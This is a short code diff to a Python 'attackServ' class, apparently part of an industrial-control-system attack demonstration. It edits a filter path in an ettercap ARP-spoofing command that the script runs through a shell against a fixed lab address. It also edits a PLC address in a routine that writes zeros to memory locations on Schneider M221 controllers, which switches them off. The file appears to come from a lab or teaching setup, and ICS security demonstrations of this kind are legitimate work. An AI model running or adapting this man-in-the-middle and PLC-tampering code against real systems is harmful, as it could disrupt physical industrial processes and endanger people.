@@ -54,7 +54,7 @@ class attackServ(object):
         elif tag == 'A':
             if val == '1':
                 print('starting the attack.')
-                atkStr = "sudo ettercap -T -q -F /home/pi/scada/memo/m221_3.ef -M ARP /192.168.10.21//"
+                atkStr = "sudo ettercap -T -q -F /home/pi/scada/demo/m221_3.ef -M ARP /192.168.10.21//"
                 p = subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                 print(p)
                 time.sleep(1)
@@ -71,7 +71,7 @@ class attackServ(object):
         print("Off all the m221 plc")
         memList = ('M0', 'M10', 'M20','M60')
         plc1 = m221.M221('192.168.10.72')
-        plc2 = m221.M221('192.168.10.73')
+        plc2 = m221.M221('192.168.10.71')
         for memAddr in memList:
             plc1.writeMem(memAddr, 0)
             plc2.writeMem(memAddr, 0)
